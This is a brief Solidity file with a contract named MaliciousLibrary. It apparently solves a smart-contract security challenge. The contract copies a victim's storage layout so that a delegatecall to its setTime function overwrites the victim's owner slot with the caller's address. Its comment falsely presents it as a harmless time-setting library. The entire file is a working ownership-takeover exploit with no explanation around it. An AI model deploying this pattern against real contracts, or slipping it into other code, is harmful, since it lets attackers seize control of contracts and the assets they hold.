// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simple library contract to set the time
contract MaliciousLibrary {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 

  function setTime(uint256 _time) public {
    owner = msg.sender;
  }
}